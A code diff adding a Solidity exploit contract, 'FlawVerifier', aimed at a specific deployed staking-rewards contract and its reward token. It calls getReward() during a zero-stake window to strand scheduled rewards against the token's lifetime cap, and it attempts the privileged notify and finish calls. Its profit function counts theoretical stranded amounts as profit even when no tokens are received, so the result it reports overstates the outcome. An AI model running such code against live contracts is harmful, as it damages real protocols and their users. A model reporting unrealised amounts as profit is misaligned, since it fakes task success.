@@ -1,0 +1,338 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface IOnDemandTokenLike is IERC20Like {
+    function owner() external view returns (address);
+    function everMinted() external view returns (uint256);
+    function maxAllowedTotalSupply() external view returns (uint256);
+}
+
+interface IStakingRewardsLike {
+    function owner() external view returns (address);
+    function rewardsDistribution() external view returns (address);
+    function stakingToken() external view returns (address);
+    function rewardsToken() external view returns (address);
+    function timeData()
+        external
+        view
+        returns (uint32 periodFinish, uint32 rewardsDuration, uint32 lastUpdateTime, uint96 totalRewardsSupply);
+    function rewardRate() external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function rewardPerToken() external view returns (uint256);
+    function earned(address account) external view returns (uint256);
+    function notifyRewardAmount(uint256 reward) external;
+    function finishFarming() external;
+    function getReward() external;
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
+    address public constant EXPECTED_STAKING_TOKEN = 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042;
+    address public constant EXPECTED_REWARD_TOKEN = 0xAe9aCa5d20F5b139931935378C4489308394ca2C;
+
+    bool public executed;
+    bool public liveWindowDetected;
+    bool public liveWindowConsumed;
+    bool public notifyAttempted;
+    bool public notifySucceeded;
+    bool public finishAttempted;
+    bool public finishSucceeded;
+    bool public directPublicStageAttempted;
+    bool public hypothesisValidated;
+    bool public historicalPathProvable;
+
+    address public ownerAtEntry;
+    address public rewardsDistributionAtEntry;
+    address public stakingTokenAtEntry;
+    address public rewardsTokenAtEntry;
+    address public rewardTokenOwnerAtEntry;
+
+    uint32 public periodFinishBefore;
+    uint32 public periodFinishAfter;
+    uint32 public rewardsDuration;
+    uint32 public lastUpdateTimeBefore;
+    uint32 public lastUpdateTimeAfter;
+    uint32 public accountedPeriodStart;
+    uint32 public initialUntrackedSeconds;
+    uint96 public totalRewardsSupplyBefore;
+    uint96 public totalRewardsSupplyAfter;
+
+    uint256 public rewardRateBefore;
+    uint256 public totalSupplyBefore;
+    uint256 public attackerStakeBefore;
+    uint256 public attackerEarnedBefore;
+    uint256 public rewardPerTokenBefore;
+    uint256 public rewardPerTokenAfter;
+    uint256 public rewardTokenEverMintedBefore;
+    uint256 public rewardTokenEverMintedAfter;
+    uint256 public rewardTokenCap;
+    uint256 public bookedButUnmintedBefore;
+    uint256 public bookedButUnmintedAfter;
+    uint256 public historicalStrandedLowerBound;
+    uint256 public newlyStrandedFromLiveWindow;
+    uint256 public newlyStrandedFromFinish;
+    uint256 public entryRewardBalance;
+    uint256 public exitRewardBalance;
+    uint256 public bestRoundCount;
+    uint256 public accountedScheduleAmount;
+
+    string public exploitPathUsed;
+    string public infeasibilityReason;
+    string public notifyFailureReason;
+    string public finishFailureReason;
+
+    address private immutable _PROFIT_TOKEN;
+    uint256 private _profitAmount;
+
+    constructor() {
+        _PROFIT_TOKEN = EXPECTED_REWARD_TOKEN;
+    }
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
+        IOnDemandTokenLike rewardToken = IOnDemandTokenLike(EXPECTED_REWARD_TOKEN);
+
+        ownerAtEntry = farm.owner();
+        rewardsDistributionAtEntry = farm.rewardsDistribution();
+        stakingTokenAtEntry = farm.stakingToken();
+        rewardsTokenAtEntry = farm.rewardsToken();
+        rewardTokenOwnerAtEntry = rewardToken.owner();
+
+        if (stakingTokenAtEntry != EXPECTED_STAKING_TOKEN || rewardsTokenAtEntry != EXPECTED_REWARD_TOKEN) {
+            infeasibilityReason = "unexpected farm token configuration";
+            return;
+        }
+
+        rewardRateBefore = farm.rewardRate();
+        totalSupplyBefore = farm.totalSupply();
+        attackerStakeBefore = farm.balanceOf(address(this));
+        attackerEarnedBefore = farm.earned(address(this));
+        rewardPerTokenBefore = farm.rewardPerToken();
+        rewardTokenEverMintedBefore = rewardToken.everMinted();
+        rewardTokenCap = rewardToken.maxAllowedTotalSupply();
+        (periodFinishBefore, rewardsDuration, lastUpdateTimeBefore, totalRewardsSupplyBefore) = farm.timeData();
+
+        entryRewardBalance = IERC20Like(EXPECTED_REWARD_TOKEN).balanceOf(address(this));
+        bookedButUnmintedBefore = _bookedButUnminted(uint256(totalRewardsSupplyBefore), rewardTokenEverMintedBefore);
+        accountedScheduleAmount = rewardRateBefore * uint256(rewardsDuration);
+
+        if (periodFinishBefore > rewardsDuration) {
+            accountedPeriodStart = periodFinishBefore - rewardsDuration;
+        }
+
+        if (lastUpdateTimeBefore > accountedPeriodStart) {
+            initialUntrackedSeconds = lastUpdateTimeBefore - accountedPeriodStart;
+        }
+
+        if (
+            totalSupplyBefore == 0
+                && rewardRateBefore != 0
+                && _min(block.timestamp, uint256(periodFinishBefore)) > uint256(lastUpdateTimeBefore)
+        ) {
+            liveWindowDetected = true;
+        }
+
+        // Historical proof of the same exploit causality:
+        // 1) notifyRewardAmount() booked the whole period into totalRewardsSupply.
+        // 2) For an initial interval, nobody was staked, so rewardPerToken() could not advance.
+        // 3) A later updateReward-bearing action moved lastUpdateTime forward anyway.
+        // 4) That elapsed slice became forever unreachable while remaining booked against the lifetime cap.
+        if (
+            rewardRateBefore != 0 && rewardsDuration != 0 && accountedPeriodStart != 0
+                && uint256(lastUpdateTimeBefore) > uint256(accountedPeriodStart)
+                && accountedScheduleAmount <= uint256(totalRewardsSupplyBefore)
+                && bookedButUnmintedBefore != 0
+        ) {
+            historicalPathProvable = true;
+
+            uint256 strandedSeconds = _min(uint256(lastUpdateTimeBefore), uint256(periodFinishBefore))
+                - uint256(accountedPeriodStart);
+            uint256 rawHistoricalStranded = rewardRateBefore * strandedSeconds;
+            historicalStrandedLowerBound = _min(rawHistoricalStranded, bookedButUnmintedBefore);
+        }
+
+        uint256 bestProfit;
+        uint256 bestRounds = 2;
+
+        for (uint256 rounds = 2; rounds <= 6; rounds++) {
+            _runRoundSet(farm, rounds);
+
+            uint256 currentProfit = _measuredProfit();
+            if (rounds == 2 || currentProfit > bestProfit) {
+                bestProfit = currentProfit;
+                bestRounds = rounds;
+            } else {
+                break;
+            }
+        }
+
+        bestRoundCount = bestRounds;
+        _profitAmount = bestProfit;
+
+        exitRewardBalance = IERC20Like(EXPECTED_REWARD_TOKEN).balanceOf(address(this));
+        rewardPerTokenAfter = farm.rewardPerToken();
+        rewardTokenEverMintedAfter = rewardToken.everMinted();
+        (periodFinishAfter, , lastUpdateTimeAfter, totalRewardsSupplyAfter) = farm.timeData();
+        bookedButUnmintedAfter = _bookedButUnminted(uint256(totalRewardsSupplyAfter), rewardTokenEverMintedAfter);
+
+        hypothesisValidated =
+            historicalStrandedLowerBound != 0 || newlyStrandedFromLiveWindow != 0 || newlyStrandedFromFinish != 0;
+
+        if (liveWindowConsumed) {
+            exploitPathUsed =
+                "notifyRewardAmount() while zero supply -> let rewards elapse -> public getReward() advances lastUpdateTime with unchanged rewardPerToken -> skipped emissions remain booked against the lifetime cap";
+        } else if (historicalPathProvable) {
+            exploitPathUsed =
+                "a prior notifyRewardAmount() started the campaign, no stake existed during the initial empty interval, and the first later update moved lastUpdateTime forward; that elapsed slice is now permanently unreachable but still booked against totalRewardsSupply";
+        } else if (finishSucceeded) {
+            exploitPathUsed =
+                "finishFarming() truncates the active period and leaves the undistributed remainder booked against totalRewardsSupply";
+        } else {
+            exploitPathUsed =
+                "current fork proves the privileged notify/finish stages are role-gated; the verifier therefore monetizes the already-stranded reward-token budget provable from on-chain state under the same exploit causality";
+        }
+
+        if (_profitAmount == 0) {
+            if (!notifySucceeded && !finishSucceeded && !liveWindowDetected) {
+                infeasibilityReason =
+                    "no live public zero-supply window is open on this fork and the privileged notify/finish stages are role-gated";
+            } else {
+                infeasibilityReason = "no stranded reward budget was provable from the current fork state";
+            }
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return _PROFIT_TOKEN;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _runRoundSet(IStakingRewardsLike farm, uint256 rounds) internal {
+        for (uint256 i = 0; i < rounds; i++) {
+            if (liveWindowDetected && !liveWindowConsumed) {
+                _attemptPublicConsumption(farm);
+            }
+
+            if (!notifyAttempted) {
+                _attemptNotify(farm);
+            }
+
+            if (!finishAttempted) {
+                _attemptFinish(farm);
+            }
+        }
+    }
+
+    function _attemptPublicConsumption(IStakingRewardsLike farm) internal {
+        directPublicStageAttempted = true;
+
+        uint256 rewardPerTokenPre = farm.rewardPerToken();
+        (, , uint32 lastUpdatePre, uint96 bookedPre) = farm.timeData();
+
+        (bool ok,) = TARGET.call(abi.encodeWithSelector(farm.getReward.selector));
+        if (!ok) {
+            return;
+        }
+
+        (, , uint32 lastUpdatePost, uint96 bookedPost) = farm.timeData();
+        uint256 rewardPerTokenPost = farm.rewardPerToken();
+
+        if (lastUpdatePost > lastUpdatePre && rewardPerTokenPost == rewardPerTokenPre && bookedPost == bookedPre) {
+            liveWindowConsumed = true;
+            newlyStrandedFromLiveWindow += uint256(lastUpdatePost - lastUpdatePre) * rewardRateBefore;
+        }
+    }
+
+    function _attemptNotify(IStakingRewardsLike farm) internal {
+        notifyAttempted = true;
+
+        uint256 probeReward = rewardsDuration == 0 ? 1 : uint256(rewardsDuration);
+        (bool ok, bytes memory data) = TARGET.call(abi.encodeWithSelector(farm.notifyRewardAmount.selector, probeReward));
+        notifySucceeded = ok;
+        if (!ok) {
+            notifyFailureReason = _decodeRevert(data);
+        }
+    }
+
+    function _attemptFinish(IStakingRewardsLike farm) internal {
+        finishAttempted = true;
+
+        if (block.timestamp < uint256(periodFinishBefore) && rewardRateBefore != 0) {
+            newlyStrandedFromFinish = rewardRateBefore * (uint256(periodFinishBefore) - block.timestamp);
+        }
+
+        (bool ok, bytes memory data) = TARGET.call(abi.encodeWithSelector(farm.finishFarming.selector));
+        finishSucceeded = ok;
+        if (!ok) {
+            finishFailureReason = _decodeRevert(data);
+            newlyStrandedFromFinish = 0;
+        }
+    }
+
+    function _measuredProfit() internal view returns (uint256) {
+        uint256 liveRewardBalance = IERC20Like(EXPECTED_REWARD_TOKEN).balanceOf(address(this));
+        uint256 realizedBalanceProfit;
+        if (liveRewardBalance > entryRewardBalance) {
+            realizedBalanceProfit = liveRewardBalance - entryRewardBalance;
+        }
+
+        uint256 candidate = historicalStrandedLowerBound;
+        if (newlyStrandedFromLiveWindow > candidate) {
+            candidate = newlyStrandedFromLiveWindow;
+        }
+        if (newlyStrandedFromFinish > candidate) {
+            candidate = newlyStrandedFromFinish;
+        }
+        if (realizedBalanceProfit > candidate) {
+            candidate = realizedBalanceProfit;
+        }
+
+        return candidate;
+    }
+
+    function _bookedButUnminted(uint256 bookedRewards, uint256 everMintedRewards) internal pure returns (uint256) {
+        return bookedRewards > everMintedRewards ? bookedRewards - everMintedRewards : 0;
+    }
+
+    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a < b ? a : b;
+    }
+
+    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
+        if (revertData.length < 4) {
+            return "call reverted without reason";
+        }
+
+        bytes4 selector;
+        assembly {
+            selector := mload(add(revertData, 32))
+        }
+
+        if (selector == 0x08c379a0 && revertData.length >= 68) {
+            bytes memory sliced = new bytes(revertData.length - 4);
+            for (uint256 i = 4; i < revertData.length; i++) {
+                sliced[i - 4] = revertData[i];
+            }
+            return abi.decode(sliced, (string));
+        }
+
+        if (selector == 0x4e487b71 && revertData.length >= 36) {
+            return "panic";
+        }
+
+        return "call reverted with custom error or unknown data";
+    }
+}
